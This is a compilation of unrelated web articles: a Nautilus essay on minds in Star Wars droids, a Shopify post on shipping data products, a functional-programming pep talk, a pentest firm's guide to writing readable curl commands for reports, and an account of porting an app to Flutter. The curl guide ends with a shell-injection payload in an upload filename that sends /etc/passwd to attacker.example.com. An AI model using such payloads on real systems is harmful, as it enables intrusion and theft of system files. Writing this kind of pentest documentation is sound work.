whether the robots in our own future have minds.<br></p><p>In fact, we unthinkingly make judgments about the minds of others every day. How do you decide if a drone has a mind? Your cat? Your best friend? The fact is you don’t actually know for certain about anyone or anything, but you can make reasonable guesses. A drone? Almost certainly not. Your cat? Sure, to some extent. Your best friend? Almost definitely. But what are these guesses based on?</p><p>Philosopher Daniel Dennett proposed that there are several different perspectives you can take when you want to predict what something is going to do.<sup>3</sup> The most useful perspective for so-called “agents,” like your cat or your friend, is what he called the <i>intentional stance</i>: You assume the agent can act rationally to achieve its goals and desires. Why did your cat walk toward the food dish? Why did your friend walk toward the fridge? Same reason: They were hungry and they acted to eliminate their hunger.</p><p>If you watched your cat and your best friend for long enough, you would have more difficulty explaining your cat’s behavior this way than your friend’s behavior. (As an entire genre of TikTok videos can attest to, cats sometimes do things that defy rational understanding, at least from our perspective. Your friend might too, but far less often.) But you wouldn’t have any luck at all explaining the drone’s behavior by thinking about it as a rational agent. Why did the drone head toward the fridge? Not because it was hungry. The more easily we can explain the actions of something using the intentional stance, the more likely we are to attribute sentience to it.</p><p>When I watch R2-D2, BB-8, and IG-11, I see behavior that looks a lot more like my friends’ behavior than a drone’s behavior. Their behavior is intentional—a sign of sentience. But their behavior is far more than just intentional. It’s intelligent.</p><div>

<p>By Ryota Kanai</p>
<p>
People often ask me whether human-level artificial intelligence will eventually become conscious. My response is: Do you want it to be conscious? I think it is largely up to us whether our machines will wake up. That may sound presumptuous....<strong><a href="http://m.nautil.us/issue/47/Consciousness/we-need-conscious-robots" data-trval="we-need-conscious-robots" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div><p>A critical component of human-level intelligence is social understanding: the ability to infer what other people and agents want or what they’re feeling. In <i>The Mandalorian</i>, despite IG-11’s flat, robotic voice, he’s not short on social understanding. For example, after brutally taking down two stormtroopers in front of Grogu (known to most as <a href="https://nautil.us/blog/what-makes-baby-yoda-so-lovable" target="_blank">Baby Yoda</a>), he apologizes to Grogu for having to see it. And in a tender moment at the end of the first season, when IG-11 is treating Mando for a serious wound, IG-11 understands that Mando might be scared, and reacts like an empathetic doctor with a kind bedside manner: “You have suffered damage to your central processing unit ... That was a joke. It was meant to put you at ease.”</p><p>But IG-11 was programmed for caretaking. What about a droid like R2-D2?</p><p>R2 reveals his social intelligence in the way he manipulates people using his knowledge of their beliefs and feelings. In <i>A New Hope</i>, R2 tricks Luke into removing his restraining bolt. In <i>The Last Jedi</i>, he manipulates Luke again into training Rey by guilt-tripping him with a reminder of his sister and his feelings of duty. This behavior is actually quite sophisticated: Children generally don’t develop the ability to manipulate others like this until at least 3 or 4, after most have learned to speak in full sentences.<sup>4</sup> More importantly, we don’t have any robots in our world that can do this.</p><p>Lastly, droids can <i>feel</i>. This appears to be true in the literal sense—in <i>Return of the Jedi</i>, we see one droid crying out in what seems to be pain as it’s tortured in Jabba’s dungeon. But droids also clearly feel complex emotions. As just one example, in <i>The Force Awakens</i>, could you describe BB-8’s reaction on learning from Finn that Poe was killed in a crash as anything other than “sorrowful”?</p><p>Droids’ ability to feel is important because research suggests that we decide whether an agent has a mind based on two factors: whether it is capable of making decisions and plans <i>and</i> whether it is capable of feeling. In a 2007 survey of over 2,000 people led by psychologist Heather Gray, only humans were rated high on both of these factors (dogs and chimps were rated about as high people in ability to feel but not as high in ability to make decisions and plan).<sup>5</sup></p><p>Of course, we can only infer droids’ feelings from their behavior. And the filmmakers of <i>Star Wars</i> have sometimes taken advantage of this aspect of our psychology for dramatic effect. For example, as robotic as IG-11’s movements and speech sometimes seem, he’s nothing compared to the machine-like Dark Troopers introduced in Season 2 of <i>The Mandalorian</i>. They don’t speak at all, and move in rigid lock-step, making them seem much more like simple machines lacking in experience than sentient agents.</p><figure><iframe width="733" height="412" src="https://www.youtube.com/embed/YfQ6pqrxHwI" frameborder="0" allowfullscreen=""></iframe></figure><p>This contrast is part of a running theme throughout <i>Star Wars</i>, in which the “bad” droids are depicted as more robotic than their “good” counterparts. Compare BB-8 to his First Order counterpart BB-9E in <i>The Last Jedi</i>, or K-2SO to his identical Imperial K-2 units in <i>Rogue One</i>. BB-8 moves fluidly and playfully, and K-2SO walks with a lazy gait and gesticulates wildly, while their counterparts move rigidly and precisely. Does this necessarily mean that BB-9E or the Dark Troopers aren’t sentient? Not at all. But it’s hard not to perceive them as having minds with less feeling or experience than droids like IG-11 and BB-8.</p><p>It’s an unfortunate feature of common language that “human” often means compassionate and thoughtful and is often contrasted with “robotic,” meaning cold and logical. The droids of <i>Star Wars</i>, however, show us that there is nothing inherently human about being compassionate, nor is there any contradiction in a robot having a mind. R2-D2 and BB-8 don’t even look human, yet they are highly expressive and intelligent. IG-11 looks a little more like us, but he explicitly tells Mando that he is “not a living thing.” Yet even the droid-hating Mando understands that this isn’t a reason to deny IG-11 the same psychological status he’d give to a friend; when IG-11 sacrifices himself to save Grogu, Mando, and their friends, Mando feels the way any of us would: sad.</p><p>This …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>Shipping a new product is hard. Doing so under tight time constraints is even harder. It’s no different for data-centric products. Whether it’s a forecast, a classification tool, or a dashboard, you may find yourself in a situation where you need to ship a new data product in a seemingly impossible timeline.&nbsp;</p>
<p>Shopify’s Data Science team has certainly found itself in this situation more than a few times over the years. Our team focuses on creating data products that support our merchants’ entrepreneurial journeys, from their initial interaction with Shopify, to their first sale, and throughout their growth journey on the platform. Commerce is a fast changing industry, which means we have to build and ship fast to ensure we’re providing our merchants with the best tools to help them succeed.</p>
<p>Along the way, our team learned a few key lessons for shipping data products quickly, while maintaining focus and getting things done efficiently—<em>but also done right.</em> Below are four tips that are proven to help you ship new products fast.&nbsp;</p>

<p>Investing time in a design sprint pays off down the line as you approach deadlines. The design sprint (created by <a href="https://www.gv.com/sprint/" target="_blank" title="Google Ventures" rel="nofollow noopener noreferrer">Google Ventures</a>) is “a process for answering critical business questions through design, prototyping and testing ideas with customers.” Sprints are great for getting a new data product off the ground quickly because they carve out specific time blocks and resources for you and your team to work on a problem. The Shopify Data Science teams make sprints a common practice, especially when we’re under a tight deadline. When setting up new sprints, here are the steps we like to take:</p>
<ol>
<li>
<strong><em>Choose an impactful problem to tackle. </em></strong>We focus on solving problems for our merchants, but in order to do that, we first have to uncover what those problems are by asking questions. <em>What</em> is the problem we’re trying to solve? <em>Why </em>are we solving this problem? Asking questions empowers you to find a problem worth tackling, identify the right technical solution and ultimately drive impact.</li>
<li>
<strong><em>Assemble a small sprint team</em></strong>: Critical to the success of any sprint is assembling a small team (no more than 6 or 7) of highly motivated individuals. Why a small team? It’s easier to stay aligned in a smaller group due to better communication and transparency, which means it’s easier to move fast.</li>
<li>
<strong><em>Choose a sprint Champion:</em></strong> This individual should be responsible for driving the direction of the project and making decisions when needed (should we use solution A or B?). Assigning a Champion helps remove ambiguity and allow the rest of the team to focus their energy on solving the problem in front of them.</li>
<li>
<strong><em>Set your sprint dates:</em></strong> Timeboxing is one of the main reasons why sprints are so effective. By setting fixed dates, you're committing your team to focus on shipping on a precise timeline. Typically, a sprint lasts up to five days. However, the timeline can be shortened based on the size of the project (for example, three days is likely enough time for creating the first version of a dashboard that follows the impact of COVID-19 on the business’s acquisition funnel).</li>
</ol>
<p>With your problem identified, your team set up, and your dates blocked off, it’s now time to sprint. Keep in mind while exploring solutions that solving a data-centric problem with a non-data focused approach can sometimes be simple and time efficient. For instance, asking a user for its preferred location rather than inferring it using a complex heuristic.</p>

<p>Speed is critical! The first iterations of a brand new product often go through many changes. Prototypes allow for quick and cheap learning cycles. They also help prevent the sunk cost fallacy (when a past investment becomes a rationale for continuing).&nbsp;</p>
<p>In the data world, a good rule of thumb is to leverage spreadsheets for building a prototype. Spreadsheets are a versatile tool that help accelerate build times, yet are often underutilized by data scientists and engineers. By design, spreadsheets allow the user to make sense of data in messy contexts, with just a few clicks. The built-in functions cover most basic use cases:&nbsp;</p>
<ul>
<li>cleaning data by hand rapidly</li>
<li>displaying graphs</li>
<li>computing basic ranking indices</li>
<li>formatting output data.</li>
</ul>
<p>While creating a robust system is desirable, it often comes at the expense of longer building times. When releasing a brand new data product under a tight timeline, the focus should be on developing prototypes fast.&nbsp;</p>
<figure><img alt="A sample Google Sheet dashboard evaluating Inbound Leads.  The dashboard consists of 6 charts.  The 3 line charts on the left measure Lead Count, Qualification Rate %, and Time to Qualification in Minutes.  The 3 bar charts on the right  measure Leads by Channel, Leads by Country, and Leads by Last Source Touched." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455" src="https://cdn.shopify.com/s/files/1/0779/4361/files/google-sheets-dashboard-prototype_8e7a900e-b66d-4618-a4d0-fdb26359a44b.jpg?v=1614705455">
<figcaption>An example of a dashboard prototype created within Google Sheets.</figcaption>
</figure>
<p>Despite a strong emphasis on speed, a prototype should still look and feel professional. For example, the first iteration of the <a href="https://www.shopify.my/blog/marketing-attribution" target="_blank" title="Marketing Attribution: Seeing the Customer Journey More Clearly" rel="noopener noreferrer">Marketing attribution tool</a> developed for Shopify’s Revenue team was a collection of SQL queries automated by a bash script. The output was then formatted in a spreadsheet. This allowed us to quickly make changes to the prototype and compare it to out-of-the-box tools. We avoided any wasted effort spinning up dashboards, production code, as well as any sentimental attachment to the work, which made it easier for the best solution to win.</p>

<p>When building a new data product, it’s tempting to spend lots of time on a flashy machine learning algorithm. This is especially true if the product is supposed to be “smart”. Building a machine learning model for your first iteration can cost a lot of time. For example, when sprinting to build a lead scoring system for our Sales Representatives, our team spent 80% of the sprint gathering features and training a model. This left little time to integrate the product with the existing <a href="https://en.wikipedia.org/wiki/Customer_relationship_management" target="_blank" title="Customer Relationship Management on Wikipedia" rel="nofollow noopener noreferrer">customer relationship management</a> (CRM) infrastructure, polish it, and ask for feedback. A simple ranking using a proxy metric would be much faster to implement for the first iteration. The time gained would allow for more conversations with the users about the impact, use and engagement with the tool.&nbsp;</p>
<p>We took that lesson to heart in our next project when we built a sales forecasting tool. We started with a linear regression using only two input variables that allowed us to have a prototype ready in a couple of hours. Using a simple model allowed us to ship fast and quickly learn whether it solved our user’s problem. Knowing we were on the right track, we then built a more complex model using machine learning.</p>
<p>Focus on building models that solve problems and can be shipped quickly. Once you’ve proven that your product is effective and delivers impact, then you can focus your time and resources on building more complex models.&nbsp;</p>

<p>Shipping fast also means shipping the right product. In order to stay on track, gathering feedback from users is invaluable! It allows you to build the right solution for the problem you’re tackling. Take the time to talk to your users, before, during, and after each build iteration. Shadowing them, or even doing the task yourself is a great return on investment.</p>
<p>Gathering feedback is an art. Entire books and research papers are dedicated to it. Here are the two tips we use at Shopify that increased the value of feedback we’ve received:</p>
<ul>
<li>
<em>Ask specific questions.</em> Asking, “Do you have any feedback?” doesn’t help the user direct their thoughts. Questions like, “How do you feel about the speed at which the dashboard loads?” or “Are you able to locate the insights you need on this dashboard to report on top of funnel performance?” are more targeted and will yield richer feedback.</li>
</ul>
<ul>
<li>
<em>Select a diverse group of users for feedback</em>. Let’s suppose that you are building a dashboard that’s going to be used by three regional teams. It’s more effective to send a request for feedback to one person in each team rather than five people in a single team.</li>
</ul>
<figure><img alt="A sample Google Form that measures Prototype A's Scoring.  The form consists of 2 questions. The first question is &quot;Is the score easy to parse and interpret? It is scored using a ranking from 1 - 5 with 1 = Very Hard and 5 = Very Easy. The 2nd question is &quot;Additional Comments&quot; and has a text field for the answer." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664" src="https://cdn.shopify.com/s/files/1/0779/4361/files/sample-google-form.jpg?v=1614705664">
<figcaption>Feedback our team asked for the scoring system we created. When asking for feedback, you want to ask specific questions so you can yield better feedback.</figcaption>
</figure>
<p>We implemented the two tips when requesting feedback from users of the sales forecasting tool highlighted in the previous section. We asked a diverse group specific questions about our product, and learned that displaying a numerical score (0 - 100) was confusing. The difference between scores wasn’t clear to the users. Instead, it was suggested to display grades (A, B, C) which turned out to be much quicker to interpret and led to a better user experience.</p>
<p>At Shopify, following these tips has provided the team with a clearer path for launching brand new data products under tight time constraints. More importantly, it helped us avoid common pitfalls like getting stuck during neverending design phases, overengineering complex machine learning systems, or building data products that users don’t use.&nbsp;</p>
<p>Next time you’re under a tight timeline to ship a new data product, remember to:</p>
<ol>
<li>
<strong><em>Utilize design sprints</em></strong> to help focus your team’s efforts and remove the stress of the ticking clock</li>
<li>
<strong><em>Don’t skip on prototyping,</em></strong> it’s a great way to fail early</li>
<li>
<strong><em>Avoid machine learning</em></strong> (for first iterations) to avoid being slowed down by unnecessary complexity</li>
<li>
<strong><em>Talk to your users</em></strong> so you can get a better sense of what problem they’re facing and what they need in a product</li>
</ol>

<p>
  This article has been re-written, most of the original content has been moved to the next article.
</p>

<p>Wandering developer, your next adventure awaits, and I know youâ€™re ready because youâ€™ve been ready since you wrote your first line of code.</p>

<p>This journey will bring you fame of course, and glory, sooo much glory. But above all else, this journey will take you to that lost magical place where the code you write somehow speaks to you like a great melody sounds familiar even as you listen to it for the first time.</p>

<p>Itâ€™s ok for you to be <strong>skeptical</strong>, maybe all you care about is creating <strong>code that works</strong>, but this seemingly academic topic is a shortcut towards that, not a distraction, as it will dramatically reduce the times you create code that doesnâ€™t.</p>

<h2 id="do-not-postpone-this-journey">Do not postpone this journey</h2>

<p>Many have put it off in a futile attempt to master their craft first. Do not make this mistake, this journey requires no credentials or academic recognition of your readiness.</p>

<p>Do not ask for permission.</p>

<p>All you need is the <strong>love of your craft</strong> that took you here, and the inquisitive <strong>open mind</strong> of someone for whom no leap is too far to reach truer grounds.</p>

<h2 id="do-not-mistake-this-journey-for-what-its-not">Do not mistake this journey for what itâ€™s not</h2>

<p>The path ahead is not about learning an alternative way of doing the same thing, this would not be a good use of your time. Rather, this journey is about recognizing how misguided some of the concepts weâ€™ve held true have always been.</p>

<p>Going from the comfort of what you already know to the discomfort of what you donâ€™t even realize you donâ€™t know requires curiosity, but it also requires courage.</p>

<h2 id="there-is-no-courage-without-fear">There is no courage without fear</h2>

<p>The fear of investing oneâ€™s precious time learning something before even being capable of understanding its purpose is justified.</p>

<p>Your time, and even more so your mental energy is very precious. If you feel fear, accept it, embrace it even, for <strong><em>it</em></strong> is the proof that it was courage, not chance, that set you off on this journey.</p>

<h2 id="the-first-step-is-the-hardest">The first step is the hardest</h2>

<p>Even if it seems like dark magic, youâ€™ll very soon learn the basic spells, and by then you will already be a much better wizard.</p>

<p>Itâ€™s true that Functional Wonderland is vast and full of mysteries, but you donâ€™t have to venture deep to reap the rewards, in fact youâ€™ll get most of the value just from skirting its shores, and will not be doing it alone.</p>

<p>Indeed, you will not be the first <strong>object oriented programmer</strong> to set sail, neither will you be the last, but for all that attempted this perilous but infinitely rewarding journey it always started in the same <a href="https://impure.fun/fun/2021/03/04/the-objects-you-know-and-love-copy/">familiar place</a>.</p>

    <h4>4 March 2021</h4>
    
    



    <p>An important part of each penetration test is the documentation of all discovered vulnerabilities.
The documentation often includes program calls to further demonstrate how a vulnerability was found, tested or exploited. To better visualise these steps in the context of web applications, we often include invocations of the command-line HTTP client <a href="https://curl.se/">curl</a>. In the following, we discuss how program calls can be styled for documentation to appeal to all audiences.</p>
<div>
        <p><img src="https://blog.redteam-pentesting.de/2021/wholesome-curl-calls/curl-help_hu01b7b4bf6fb2e671d3b4cc1141a5d2a3_15721_640x0_resize_box_2.png" alt="curl program call for help">
        </p>
    </div>



<p>You have probably seen some more or less cryptic curl program calls, included for example in blog posts, scripts, Dockerfiles or configuration files. The program calls often are formatted as one-liners that result in very long horizontal scroll bars. Sometimes the authors use abbreviated parameter names, making it hard to understand the meaning of arguments or options.</p>
<p>Truth be told: horizontal scrolling on a mobile device is not enjoyable. Neither is a lookup into the man page to check for the abbreviated parameter’s meanings. Therefore, one should strive to write program calls that are as self-explanatory and easy readable.</p>
<p>
    In the following, we use the public instance of the <a href="https://github.com/postmanlabs/httpbin"><code>httpbin</code></a> project to demonstrate some of the curl program calls.
</p>

<!-- raw HTML omitted -->
<h3 id="consider-using-self-explanatory-parameter-options">Consider Using Self-Explanatory Parameter Options</h3>
<p>Quite often curl program calls contain abbreviated parameters like the following to not verify the TLS certificate of the remote host:</p>
<pre><code>$ curl -k https://httpbin.org/status/301
</code></pre><p>To help your readers that might not be familiar with curl or the abbreviated program parameters just use the longer versions as these are in most cases self-explanatory:</p>
<pre><code>$ curl --insecure https://httpbin.org/status/301
</code></pre><h3 id="minimise-horizontal-scrolling">Minimise Horizontal Scrolling</h3>
<p>Consider you craft a complex curl command that has the necessity to connect insecurely, suppresses its output except for response data, makes use of cookies and also includes URL parameters:</p>

<pre><code>$ curl -k -s -H 'Cookie: auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' 'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>As you see, such a program call could become very long. Instead of putting everything in one line, try to separate arguments in different lines. This makes the usage of self-explanatory parameters even more valuable:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get?foo=1&amp;bar=2' | jq .args
</code></pre><p>But what to do if your URL contains many parameters? One solution is to split the URL from the parameters like the following:</p>
<pre><code>$ curl --insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
'https://httpbin.org/get'\
'?foo=1&amp;bar=2' | jq .args
</code></pre><p>Another approach that curl supports is to define URL parameters as separate arguments. Note that for this to work, the option <code>--get</code> can be used. This declares that all data parameters curl uses per default for HTTP POST requests are now used as URL parameters for the specified request method:</p>
<pre><code>$ curl --get \
--insecure --silent \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--data 'foo=1' --data 'bar=2' \
'https://httpbin.org/get' | jq .args
</code></pre><h3 id="pretty-formatting-for-cookies----and-other-surprises-along-the-way">Pretty Formatting for Cookies – And Other Surprises Along The Way</h3>
<p>Depending on your audience, you want to write program calls that are more or less verbose. Sometimes, you also may not be aware of a better variant and stick to the parameters you are used to. The following example is seen quite often:</p>
<pre><code>$ curl -H 'Cookie: example=AABBCC; auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' https://httpbin.org/cookies
</code></pre><p>The usage of the <code>-H</code> parameter is not the only possible solution here as there is also a parameter for cookies. For readability reasons, multiple usage of the <code>--cookie</code> parameter is desired. However, at the time of writing this blog post it was not possible as per documentation multiple usages will overwrite the last one. We <a href="https://twitter.com/RedTeamPT/status/1364130000669208578">asked</a> Daniel Stenberg (<a href="https://twitter.com/bagder">@bagder</a>), the creator of curl, why this behaviour distinguishes from other parameters like the <code>--data</code> variants. He responded with the following:</p>
<blockquote>
<p>It has worked like that since October 1998 when we originally created the option. Because nobody thought of making it different then or worked on changing it since.</p>
</blockquote>
<p>To our great delight, Daniel Gustafsson (<a href="https://twitter.com/d_gustafsson">@d_gustafsson</a>) which is also one of the curl authors, decided to create a <a href="https://github.com/curl/curl/pull/6649">pull request</a> to change this behaviour! Thanks to him, in future versions of curl it will be possible to use multiple <code>--cookie</code> parameters as a more elegant solution:</p>
<pre><code>$ curl --cookie 'example=AABBCC' \
--cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
https://httpbin.org/cookies
</code></pre><p>As this happened quite recently, the release is not available yet or maybe not shipped in popular Linux distributions for now. Alternatively, string concatenation per shell can be used to separate cookies in multiple lines:</p>
<pre><code>$ curl --cookie 'example=AABBCC;'\
'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0;' \
https://httpbin.org/cookies
</code></pre><p>Nevertheless, keep an eye out for new curl releases. 😉</p>
<p>Another option might be to first display a file containing a set of cookies, for example <code>cookies.txt</code>, which has a specific format according to the <a href="https://curl.se/docs/http-cookies.html">documentation</a>:</p>
<pre><code>$ cat cookies.txt
httpbin.org	FALSE	/	TRUE	0	example	AABBCC
httpbin.org	FALSE	/	TRUE	0	auth	eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0
</code></pre><p>Afterwards, you can use that file as an input for the cookie parameter:</p>
<pre><code>$ curl --cookie cookies.txt https://httpbin.org/cookies
</code></pre><h3 id="enjoyable-post-requests">Enjoyable POST Requests</h3>
<p>Next, we’ll have a closer look at HTTP POST requests. Let’s take the following example:</p>
<pre><code>$ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'example=1&amp;input=2&amp;path=%2Fetc%2Fpasswd' https://httpbin.org/post
</code></pre><p>Here, most of the parameters can be omitted as curl automatically assumes an HTTP POST request with the respective <code>Content-Type</code> for it. Furthermore, it is not necessary to define the parameter values URL-encoded, as curl offers a neat functionality for it. As a benefit the arguments are easier to read:</p>
<pre><code>$ curl --data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \
https://httpbin.org/post
</code></pre><p>However, you still need to manually apply URL encoding for the name of a HTTP POST parameter if necessary. We opened a discussion thread for possible solutions at the <a href="https://github.com/curl/curl/discussions/6667">curl GitHub page</a>.</p>

<p>Depending on how familiar your readers are with curl, it might be of additional value to add the HTTP method used while not technically necessary:</p>
<pre><code>$ curl --method POST \
--data 'example=1' \
--data 'input=2' \
--data-urlencode 'path=/etc/passwd' \
https://httpbin.org/post
</code></pre><p>This should be considered for every option that might give readers a benefit in understanding what the program call is all about.</p>
<h3 id="about-forms">About Forms</h3>
<p>Finally, documenting file uploads or HTTP POST requests with the content type <code>multipart/form-data</code> is often very painful if directly copied from an attack proxy or somehow manually crafted for curl. For a more convenient usage the <code>--form</code> parameter is offered. An example request looks like the following:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;type=something/different;filename=testimage.png' \
--form 'example=1' \
--form 'auth=AABBCC' \
--form 'remark=&lt;longtext.txt' \
 https://httpbin.org/post
</code></pre><p>As you see in the request, the characters <code>@</code> and <code>&lt;</code> have special meanings. The first one signals that a file should be treated as a file upload, the second one reads a file and pastes the contents into the respective form field. During penetration tests, especially the value of a filename parameter could be interesting to test for shell injection vulnerabilities. Therefore, such a vulnerability could be easily demonstrated with curl using the <code>--form</code> parameter without the need to build the whole <code>multipart/form-data</code> request manually:</p>
<pre><code>$ curl --cookie 'auth=eyJpZCI6IjAiLCJuYW1lIjoiUmVkVGVhbSBQZW50ZXN0aW5nIn0' \
--form 'profile=@red.png;filename='\
'"test.png; curl --upload-file /etc/passwd https://attacker.example.com;"' \
 https://httpbin.org/post
</code></pre><p>As the attentive reader may have noticed, the <code>&lt;</code> directive is not used for the example payload to exploit the shell injection to be read from a file because these two operators cannot be combined in one <code>--form</code> parameter value yet. Therefore, the injection is quoted and later concatenated in the shell.
We also created a discussion for this at the <a href="https://github.com/curl/curl/discussions/6669">curl GitHub page</a>. Feel free to contribute to the discussion!</p>

<h3 id="final-thoughts">Final thoughts</h3>
<p>This is just a rough outline of what is possible with curl program calls. Generally speaking, it should be the number one goal for you to write program calls that are easily readable and quickly understandable. The approach is not only useful for documentation during penetration tests or blog posts. If program calls are used in scripts or code, the usage of comprehensive calls might also help you in the long run.</p>

I had just bought my first iPhone (a 3GS) and I was curious about creating apps for this fascinating little device. The app that I wanted to develop at that time was (and still is) basically an ebook on steroids. It has around 50 chapters of informational content and aims to assist its audience in certain emergencies. So the main goal of the app is to present its content in a way that the user can quickly and reliably find what they are looking for in a stressful situation.</p><p id="418e">I started the project initially as a web app using the <a href="http://jqtjs.com/" rel="noopener">jQTouch</a> library wrapped into a native <a href="https://phonegap.com/" rel="noopener">PhoneGap</a> container deployed on iOS. Right after launch, the app made it onto Apple's recommended app list in the medical category for a week, so it looked like the app did hit a nerve. Four years later I rewrote the app as a native app in Swift before I decided to port it to <a href="https://flutter.dev/" rel="noopener">Flutter</a> in September of 2020. Here is what I learned on the last leg of the journey.</p></div></div></section><section><div><div><p id="3cfd">When the decision was made to finally create an Android version of the app, the obvious question was how. A native Android port? Cross-platform? With Ionic and React or Vue.js? Or the new, cool kid on the block, Flutter? After some research into the current state of multiplatform app development, there seemed to be quite a lot of hype about the latter. And from the articles that were suggested by the Medium algorithms, I got the impression that people were generally quite happy with Google’s project and that Flutter seemed to have matured enough to be a serious alternative. So I decided to give it a go.</p><p id="aa85">Surprisingly enough my initial experiences were just as great as those hailed in the articles. Believe it or not, but without any prior knowledge of Dart and the UI design principles of Flutter (coming from iOS Swift and Xcode Interface Designer) I had my app up and running on Android and iOS with Flutter within one week — well, almost.</p><p id="9a85">When it got down to testing, I randomly started to see some very strange behavior: In the app, I show a spinner while a chapter of the ebook is loading. Once it is loaded and rendered in a WebView, I replace the spinner with the rendered content. Simple, actually. This worked 99% of the time, but at random times the app would get stuck on the spinner — obviously a no-go for an app that should help you in an emergency. It took about a day or two to find out that this was caused by Flutter’s HttpServer that crashed on iOS if the user briefly switched to another app and then back to mine. Bummer. I filed an extensive <a href="https://github.com/flutter/flutter/issues/67628" rel="noopener">bug report</a> — but no fix on the way anytime soon.</p><p id="c806">As I could not ship my app in that state, I started to look for alternative approaches. Instead of serving my ebook content via the HttpServer, I decided to copy the content from the app bundle into the app’s document directory on the first app start and then open the HTML directly in the WebView using the file:// schema. After some tests and refactoring, this seemed to be a viable workaround — until some links in the ebook stopped working on a real iOS device. Strangely, everything on Android and even in the iOS simulator worked fine. Turns out I found <a href="https://github.com/flutter/flutter/issues/67747" rel="noopener">another bug</a>, this time in the Flutter WebView package, that I filed and that also was quickly acknowledged, reproduced, and triaged by the team.<strong> But both bugs still exist in Flutter as of today (February 2021)</strong>.</p><p id="b35f">By the time I had worked around that last bug, I had spent the same time hunting down and reporting bugs in Flutter that I had spent on learning Dart and porting my app.</p></div></div></section><section><div><div><p id="c309">The Flutter HttpServer and WebView are the two most important dependencies of my app. Without one or the other, my app will simply not work in that environment. From my experiences with iOS and CocoaPods, these days I look at every dependency as a technical debt: You borrow someone’s code or functionality, and one day you might have to pay for that.</p><p id="470b">Any piece of code that is not your own and that your app depends on adds to the technical debt of your app.</p><p id="69c5">Personally, I consider WebView and HttpServer to be core parts of the Flutter technology stack as they are both developed and supported directly by the Flutter team and not some third party. (I will spare you the gruesome details of when I experimented with a third-party WebView for Flutter as an alternative.)</p><p id="7b05">Therefore I was quite surprised that they seemingly received so little love from the Flutter team. I guess that either the current team at Google is just not big enough to pull off a project like Flutter (8,230 open issues as of today) or their priorities lie elsewhere. But it did inspire me to look at the dependencies of my Flutter app in general and compare them to the native Swift version of my app. Here’s the gist:</p><h2 id="f2ce">Native iOS (Swift)</h2><ul><li id="8fd5">AEXML</li><li id="96a3">FontAwesome.swift</li></ul><p id="5a73">AEXML was needed to parse some XHTML files as the native iOS SDK does not provide a DOM parser. The second library allowed me to use the popular FontAwesome icons in my app.</p><h2 id="f022">Flutter</h2><ul><li id="7c99">cupertino_icons</li><li id="512b">HTTP</li><li id="ba01">provider</li><li id="f1f4">shared_preferences</li><li id="9297">font_awesome_flutter</li><li id="1ba8">xml2json</li><li id="c4fd">path</li><li id="029d">path_provider</li><li id="bd5f">mime</li><li id="0e6c">flutter_web_browser</li><li id="6e4d">webview_flutter</li><li id="6a97">url_launcher</li><li id="3e33">geolocator</li><li id="d6e0">geocoding</li><li id="b153">map_launcher</li><li id="6bf3">wakelock</li><li id="cb94">device_info</li><li id="57bc">package_info</li><li id="92b5">scrollable_positioned_list</li><li id="d794">in_app_review</li><li id="f5ea">share</li></ul><p id="1d42">OMG! What do I need so many packages in Flutter for? Well, being an app and not an ebook, I had added some additional features and services to my native app: an online search for professionals in the area using a third-party API, displaying some information about the user’s current location using geolocation and reverse geocoding to help guide emergency services, and a speed dial for emergency phone numbers. Each feature needed some specific function from the native platform SDK — like geolocation, geocoding, triggering a call, or preventing sleep mode while the app was open. On top of that, you have basic functionality that you will find in any decent app: asking the user for a review on occasion, allow to share content with other apps, launch URLs, open a map app at a specific location, or access some information about the local device and operating system.</p><p id="f1e9">While iOS and Android provide most of these functionalities in their native SDKs out of the box, <strong>cross-platform solutions have to provide a bridge, package, or plug-in for every single one of them. And in the case of Flutter, they have to be implemented in three languages each</strong>: Dart, Swift/Objective-C, and Java/Kotlin.</p><p id="cdec">Your Flutter app will depend on countless external libraries to allow you to offer the same functionality as a native app. The functionality of your app, therefore, depends on many unknown parties with different agendas, time constraints, and motivations for development. The technical debt of your app will increase with each plug-in that you use.</p></div></div></section><section><div><div><p id="04a0">If you aim for the least technical debt, you have to write 100% of your app code yourself and use only native SDKs to provide access to the underlying hardware. Each third-party library will add to your technical debt, so at least chose carefully if you cannot implement the functionality yourself.</p><p id="85ac">When I started testing my native iOS app, I initially discovered a huge memory leak. So where did that come from? After understanding the concept of fantastical retain cycles and how to find them, I finally discovered the culprit: The third-party XML library was leaking in a recursion. And as I was frequently parsing XHTML with it, my app became a memory hog.</p><p id="e89a">Fortunately, I could find the bug in the library with my Swift skills, fix it within a day and even submit a patch to the owner of the repository. But I could find and fix it only because the library and my app were written in the same language, and this was a language that I was familiar with.</p><p id="8e23">So if a third party library is open source and written in the same language as your app, you might be able to live with that debt quite well. But <strong>every cross-platform solution will add multiple layers of complexity to your app and introduce additional points of failure on each layer.</strong></p><p id="a30f">Any Flutter package can fail in its Dart code, Swift/Objective-C code, or Java/Kotlin code. <strong>Any update of 